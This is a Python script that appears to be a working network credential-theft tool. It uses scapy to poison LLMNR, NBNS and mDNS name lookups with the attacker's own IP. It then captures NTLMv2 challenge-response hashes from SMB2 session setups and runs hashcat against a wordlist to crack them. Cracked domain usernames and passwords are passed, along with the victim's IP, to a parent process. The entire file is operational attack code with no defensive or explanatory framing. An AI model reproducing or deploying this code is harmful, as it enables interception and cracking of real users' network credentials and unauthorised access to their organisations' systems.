import multiprocessing
from scapy.all import *
from scapy.layers.dns import DNSQR, DNSRR, DNS
from scapy.layers.gssapi import SPNEGO_negToken, SPNEGO_Token
from scapy.layers.llmnr import *
from scapy.layers.inet import UDP, IP, TCP
import socket
from scapy.layers.netbios import NBNSQueryResponse, NBNSQueryRequest, NBNS_ADD_ENTRY, NBNSHeader
from scapy.layers.ntlm import NTLM_CHALLENGE
from scapy.layers.smb2 import SMB2_Session_Setup_Request, SMB2_Session_Setup_Response
from scapy.layers.ntlm import NTLM_AUTHENTICATE
import os

hostname = socket.gethostname()
ips = socket.gethostbyname(hostname)
print("Your Computer Name is:" + hostname)
print("Your Computer IP Address is:" + ips)
hashes = {}


def NBNSfilter(packet):
    response = None
    if IP in packet and packet[IP].src != ips and UDP in packet and NBNSHeader in packet and NBNSQueryRequest in packet:
        packet.show()
        response = IP(dst=packet[IP].src) / UDP(dport=packet[UDP].sport) / NBNSHeader(
            NAME_TRN_ID=packet[NBNSHeader].NAME_TRN_ID, RESPONSE=1, ANCOUNT=1) / NBNSQueryResponse(
            RR_NAME=packet[NBNSQueryRequest].QUESTION_NAME,
            SUFFIX=packet[NBNSQueryRequest].SUFFIX, ADDR_ENTRY=NBNS_ADD_ENTRY(NB_ADDRESS=ips))
        print('suffix=' + str(packet[NBNSQueryRequest].SUFFIX))
    elif IP in packet and UDP in packet and packet[UDP].sport == 5353 and packet[
        UDP].dport == 5353 and DNS in packet and DNSQR in packet and packet[DNSQR].qtype == 1:
        packet.show()
        response = IP(dst=packet[IP].src) / UDP(sport=5353, dport=5353) / DNS(qd=packet[DNSQR],
                                                                              an=DNSRR(rrname=packet[DNSQR].qname,
                                                                                       type=1, rdata=ips))
        response.show()
    elif IP in packet and packet[IP].src != ips and UDP in packet and LLMNRQuery in packet and packet[DNSQR].qtype == 1:
        packet.show()
        response = IP(dst=packet[IP].src) / UDP(dport=packet[UDP].sport) / LLMNRResponse(id=packet[LLMNRQuery].id,
                                                                                         opcode=packet[
                                                                                             LLMNRQuery].opcode,
                                                                                         qd=packet[DNSQR],
                                                                                         an=DNSRR(rrname=packet[
                                                                                             DNSQR].qname,
                                                                                                  type=packet[
                                                                                                      DNSQR].qtype,
                                                                                                  rclass=packet[
                                                                                                      DNSQR].qclass,
                                                                                                  rdata=ips, ttl=10))
    elif IP in packet and packet[IP].src == ips and TCP in packet and SMB2_Session_Setup_Response in packet:
        print(packet)
        packet.show()
        buffer = packet[SMB2_Session_Setup_Response].Buffer[0][1]
        if SPNEGO_negToken in buffer:
            print('buffer:' + str(buffer))
            buffer.show()
            value = buffer[SPNEGO_Token].value
            value.show()
            if type(value) == NTLM_CHALLENGE:
                value = value[NTLM_CHALLENGE].ServerChallenge
                print('ServerChallenge:' + str(value))
                hashes[
                    packet[IP].dst + ':A' + str(packet[TCP].seq + len(packet[TCP]) - 20) + ':S' + str(
                        packet[TCP].ack)] = {
                    'ServerChallenge': value.hex()}
                print('hashes:' + str(hashes))
    elif IP in packet and packet[IP].dst == ips and TCP in packet and SMB2_Session_Setup_Request in packet:
        print(packet)
        packet.show()
        buffer = packet[SMB2_Session_Setup_Request].Buffer[0][1]
        print(buffer)
        if SPNEGO_negToken in buffer and SPNEGO_Token in buffer:
            print('buffer:' + str(buffer))
            buffer.show()
            value = buffer[SPNEGO_Token].value
            print('value:' + str(value))
            value.show()
            if type(value) == ASN1_STRING:
                value = value.val
                print(value)
                msg = NTLM_AUTHENTICATE(value)
                msg.show()
                loc = packet[IP].src + ':A' + str(packet[TCP].ack) + ':S' + str(packet[TCP].seq)

                print('hashes:' + str(hashes))
                msg = msg.Payload
                for credential in msg:
                    if credential[0] == 'DomainName':
                        print('DomainName:' + credential[1])
                        hashes[loc]['DomainName'] = credential[1]
                    elif credential[0] == 'UserName':
                        print('UserName:' + credential[1])
                        hashes[loc]['UserName'] = credential[1]
                    elif credential[0] == 'NtChallengeResponse':
                        print('NtChallengeResponse:')
                        credential[1].show()
                        hashes[loc]['NTPROOFstr'] = str(credential[1].Response.hex())[:32]
                        hashes[loc]['NTLMV2_Response'] = str(credential[1].Response.hex())[32:] + str(
                            credential[1].load.hex())
                child_pipe.send(hashes.popitem())
                print('hashes after send:' + str(hashes))
                print(str(hashes))

    if response:
        response.show()
        send(response)


def func(conn2):
    global child_pipe
    child_pipe = conn2
    print('start sniffing')
    sniff(lfilter=NBNSfilter)
    print('finished sniff 1')


def main(main_conn):
    print('satrt')
    conn1, conn2 = multiprocessing.Pipe()
    x = multiprocessing.Process(target=func, args=(conn2,))
    x.start()
    print(str(type(conn2)))
    while True:
        try:
            ip, credential = conn1.recv()
            ip = ip.split(':')[0]
            print('received from process:' + str(credential))
            hash = ''
            if 'UserName' in credential:
                hash += credential['UserName']
            hash += '::'
            if 'DomainName' in credential:
                hash += credential['DomainName']
            hash += ':' + credential['ServerChallenge'] + ':' + credential['NTPROOFstr'] + ':' + credential[
                'NTLMV2_Response']
            # hash = credential['UserName'] + '::' + credential['DomainName'] + ':' + credential['ServerChallenge'] + ':' + \
            #        credential['NTPROOFstr'] + ':' + credential['NTLMV2_Response']
            print('hash-' + hash)
            with open(r'hash.txt', 'w') as file:
                file.write(hash)
            os.popen('hashcat.exe -a 0 -m 5600 hash.txt cracker.txt -o cracked.txt -O > output.exe').read()
            print('finished decrypting')
            if os.stat('cracked.txt').st_size != 0:
                with open(r'cracked.txt', 'r') as file:
                    password = file.read()
                    if (password.endswith('\n')):
                        password = password[0:-1]
                print(password)
                password = password[password.rindex(':') + 1:]
                print('user:' + credential['DomainName'] + '\\' + credential['UserName'])
                print('password:' + password)
                main_conn.send([credential['DomainName'] + '\\' + credential['UserName'], password, ip])
                with open(r'cracked.txt', 'w') as file:
                    file.write('')
                if os.stat('hashcat.potfile').st_size != 0:
                    with open(r'hashcat.potfile', 'wb') as file:
                        password = file.write(b'')
            else:
                print('didnt find password')
        except Exception as e:
            print('Error is:' + str(e))


if __name__ == '__main__':
    main(main_conn=multiprocessing.Pipe()[0])
